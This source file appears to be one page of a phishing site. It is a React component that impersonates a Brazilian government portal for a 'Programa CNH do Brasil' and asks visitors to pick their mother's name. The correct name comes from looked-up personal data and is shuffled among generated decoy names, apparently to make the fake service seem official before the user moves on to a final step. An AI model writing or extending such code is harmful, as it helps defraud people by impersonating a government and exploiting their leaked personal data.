import { useMemo, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "./StepMother.css";

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function cleanText(v) {
  return String(v || "")
    .trim()
    .replace(/\s+/g, " ")
    .toUpperCase();
}

// pega nome da mãe de vários formatos
function pickMae(dados) {
  if (!dados) return "";

  const raw =
    dados.mae ||
    dados.nome_mae ||
    dados.NomeMae ||
    dados.mother_name ||
    dados.nomeMae ||
    (dados.Result &&
      (dados.Result.mae ||
        dados.Result.nome_mae ||
        dados.Result.NomeMae ||
        dados.Result.mother_name ||
        dados.Result.nomeMae)) ||
    "";

  return cleanText(raw);
}

// gera nome fake básico (bem “br” e plausível)
function genFakeMotherName(realName, used) {
  const FIRST = [
    "MARIA",
    "ANA",
    "JOSEFA",
    "APARECIDA",
    "ANTONIA",
    "FRANCISCA",
    "ADRIANA",
    "JULIANA",
    "PATRICIA",
    "CRISTINA",
    "SANDRA",
    "FERNANDA",
    "VANESSA",
    "ROSELI",
    "SUELI",
    "ELIANA",
    "CARLA",
    "RAIMUNDA",
  ];

  const LAST = [
    "SILVA",
    "SANTOS",
    "OLIVEIRA",
    "SOUZA",
    "LIMA",
    "PEREIRA",
    "COSTA",
    "FERREIRA",
    "ALMEIDA",
    "RODRIGUES",
    "GOMES",
    "RIBEIRO",
    "CARVALHO",
    "MARTINS",
    "ARAUJO",
    "BARBOSA",
    "CARDOSO",
    "NASCIMENTO",
  ];

  const MID = [
    "DA",
    "DE",
    "DO",
    "DAS",
    "DOS",
    "PEREIRA",
    "ROCHA",
    "MORAES",
    "BATISTA",
    "MENDES",
    "TEIXEIRA",
  ];

  for (let tries = 0; tries < 80; tries++) {
    const f1 = FIRST[Math.floor(Math.random() * FIRST.length)];
    const f2 = Math.random() < 0.45 ? FIRST[Math.floor(Math.random() * FIRST.length)] : "";
    const m = MID[Math.floor(Math.random() * MID.length)];
    const l1 = LAST[Math.floor(Math.random() * LAST.length)];
    const l2 = Math.random() < 0.55 ? LAST[Math.floor(Math.random() * LAST.length)] : "";

    const name = cleanText([f1, f2, m, l1, l2].filter(Boolean).join(" "));
    if (!name) continue;
    if (name === realName) continue;
    if (used.has(name)) continue;

    used.add(name);
    return name;
  }

  return null;
}

export default function StepMother() {
  const location = useLocation();
  const navigate = useNavigate();

  const data = location.state;
  const [selected, setSelected] = useState("");

  const { maeReal, opcoes } = useMemo(() => {
    const real = pickMae(data?.dados);
    const safeReal = real || "NOME NÃO ENCONTRADO";

    const used = new Set([safeReal]);
    const fakes = [];

    if (safeReal !== "NOME NÃO ENCONTRADO") {
      while (fakes.length < 3) {
        const fake = genFakeMotherName(safeReal, used);
        if (!fake) break;
        fakes.push(fake);
      }
    }

    while (fakes.length < 3) {
      fakes.push("NOME NÃO ENCONTRADO");
    }

    return {
      maeReal: safeReal,
      opcoes: shuffle([safeReal, ...fakes]),
    };
  }, [data]);

  if (!data) return <div className="step-loading">Carregando...</div>;

  const goNext = () => {
    if (!selected) return;

    navigate("/final", {
      state: {
        ...data,
        maeSelecionada: selected,
      },
    });
  };

  return (
    <div className="gov-page">
      {/* HEADER */}
      <header className="g-header">
        <div className="g-header-inner">
          <div className="g-left">
            <img className="g-logo" src="/logo.png" alt="Logo" />
            <button className="g-burger" type="button" aria-label="Menu">
              ☰
            </button>
            <a className="g-link" href="#" onClick={(e) => e.preventDefault()}>
              Programa CNH do Brasil
            </a>
          </div>

          <div className="g-right" aria-hidden="true">
            <span className="g-dot">⋮</span>
            <span className="g-circle">⦿</span>
            <span className="g-grid">⌗</span>
            <span className="g-avatar">●</span>
          </div>
        </div>
      </header>

      {/* CONTEÚDO */}
      <main className="g-main">
        <section className="g-card">
          <h1 className="g-card-title">
            Confirme seus dados para o cadastro no Programa CNH do Brasil
          </h1>

          <div className="g-steprow">
            <div className="g-stepcircle">3</div>
            <div className="g-question">Qual é o nome da sua mãe?</div>
          </div>

          <div className="g-list" role="list">
            {opcoes.map((n, idx) => {
              const active = selected === n;
              return (
                <button
                  key={idx}
                  type="button"
                  className={`g-item ${active ? "is-active" : ""}`}
                  onClick={() => setSelected(n)}
                >
                  <span className="g-item-text">{n}</span>
                </button>
              );
            })}
          </div>

          <button
            className="g-confirm"
            type="button"
            disabled={!selected || maeReal === "NOME NÃO ENCONTRADO"}
            onClick={goNext}
          >
            Confirmar
          </button>
        </section>
      </main>
    </div>
  );
}